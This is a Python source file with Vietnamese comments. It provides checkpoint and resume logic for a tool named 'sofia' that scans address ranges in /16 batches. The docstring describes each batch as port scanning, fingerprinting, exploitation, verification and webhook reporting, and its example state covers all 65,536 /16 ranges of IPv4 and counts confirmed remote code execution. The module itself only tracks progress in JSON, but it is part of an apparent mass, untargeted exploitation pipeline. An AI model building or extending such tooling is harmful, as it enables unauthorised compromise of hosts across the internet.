# -*- coding: utf-8 -*-
"""
checkpoint.py — Checkpoint/resume cho quét theo batch dải /16 (nâng cấp mới).

Khi AUTO_GEN_RANGES bật, pipeline quét từng batch dải /16. Sau mỗi batch
(quét cổng → fingerprint → exploit → verify → webhook), trạng thái được ghi
vào STATE_FILE (mặc định results/state.json) để:

  * Chạy lại (`python3 main.py`) → bỏ qua các dải đã hoàn tất, tiếp tục từ
    dải kế tiếp (resume an toàn, không quét trùng).
  * `--no-resume` → quét lại từ đầu (mọi dải pending).
  * `--retry-failed` → đưa các dải lỗi quay lại hàng đợi.

Cấu trúc state.json:
{
  "version": 1,
  "key":      {"cidr": "...", "split_to": 16, "seed": 0, "max_chunks": 0},
  "total":    65536,
  "completed": ["203.0.113.0/16", ...],
  "failed":   [],
  "last_updated": "2026-09-10T00:00:00Z",
  "stats": {"total_findings": 12, "rce_confirmed": 3}
}
"""

import json
import logging
import os
import time

from config import STATE_FILE

log = logging.getLogger("sofia.checkpoint")

VERSION = 1


def _now():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def load_state(path=STATE_FILE):
    """Đọc state từ file. Trả về dict rỗng (version=1) nếu chưa có/đọc lỗi."""
    empty = {"version": VERSION, "key": {}, "total": 0,
             "completed": [], "failed": [], "last_updated": _now(), "stats": {}}
    if not path or not os.path.isfile(path):
        return empty
    try:
        with open(path, encoding="utf-8") as fh:
            state = json.load(fh)
        state.setdefault("version", VERSION)
        state.setdefault("completed", [])
        state.setdefault("failed", [])
        state.setdefault("stats", {})
        return state
    except (ValueError, OSError) as exc:
        log.warning("Đọc state %s lỗi (%r) — bắt đầu mới", path, exc)
        return empty


def save_state(state, path=STATE_FILE):
    """Ghi state (ghi atomic: tmp + rename để không hỏng file giữa chừng)."""
    state["last_updated"] = _now()
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(state, fh, ensure_ascii=False, indent=2)
        os.replace(tmp, path)
        return True
    except OSError as exc:
        log.warning("Ghi state %s lỗi: %r", path, exc)
        return False


def init_state(ranges, key=None, path=STATE_FILE):
    """Tạo state mới từ danh sách dải (completed rỗng, total = len).
    Lưu cả danh sách `ranges` gốc — cần để suy pending khi resume."""
    state = load_state(path)
    if state.get("total") and state.get("key") == key and state.get("ranges"):
        # Cùng tham số sinh dải + đã có hàng đợi → giữ nguyên tiến độ (resume)
        return state
    state.update({
        "version": VERSION,
        "key": dict(key or {}),
        "total": len(ranges),
        "ranges": list(ranges),
        "completed": [],
        "failed": [],
        "stats": {},
    })
    save_state(state, path)
    return state


def pending_ranges(state, retry_failed=False):
    """Danh sách dải CHƯA xong, giữ đúng thứ tự hàng đợi gốc.

    Để bỏ qua đúng dải đã quét, state phải nhớ danh sách dải đầy đủ —
    nhưng để file nhẹ, ta suy ngược: completed + failed ∪ pending = total.
    Do vậy state cần lưu cả `ranges` (thứ tự gốc). Nếu thiếu → fallback:
    coi mọi dải pending (chỉ xảy ra với state file cũ).
    """
    ranges = state.get("ranges") or []
    done = set(state.get("completed", []))
    failed = set(state.get("failed", []))
    if retry_failed:
        done -= failed          # đưa dải lỗi trở lại hàng đợi
    else:
        done |= failed
    if not ranges:
        return []               # state cũ không có `ranges` — không đoán mò
    return [r for r in ranges if r not in done]


def next_batch(state, batch_size, retry_failed=False):
    """Lấy batch kế tiếp (list dải /16 chưa xong, tối đa batch_size)."""
    pending = pending_ranges(state, retry_failed=retry_failed)
    return pending[:batch_size]


def mark_done(state, ranges, stats=None):
    """Đánh dấu dải đã hoàn tất; cộng dồn stats (findings/rce)."""
    done = set(state.get("completed", []))
    for r in ranges:
        done.add(r)
    state["completed"] = sorted(done)
    state["failed"] = [r for r in state.get("failed", []) if r not in done]
    if stats:
        agg = state.setdefault("stats", {})
        for k, v in (stats or {}).items():
            agg[k] = agg.get(k, 0) + int(v or 0)
    return state


def mark_failed(state, ranges):
    """Đánh dấu dải lỗi (vd lỗi cấu hình nghiêm trọng) — không quét lại
    trừ khi --retry-failed."""
    failed = set(state.get("failed", []))
    for r in ranges:
        if r not in state.get("completed", []):
            failed.add(r)
    state["failed"] = sorted(failed)
    return state


def set_ranges(state, ranges):
    """Ghi danh sách dải gốc (thứ tự hàng đợi) vào state — cần cho resume."""
    state["ranges"] = list(ranges)
    state["total"] = len(ranges)
    return state


def progress(state):
    """(done, total) cho log/webhook."""
    total = state.get("total") or 0
    done = len(state.get("completed", []))
    return done, total


__all__ = [
    "load_state", "save_state", "init_state", "pending_ranges",
    "next_batch", "mark_done", "mark_failed", "set_ranges",
]

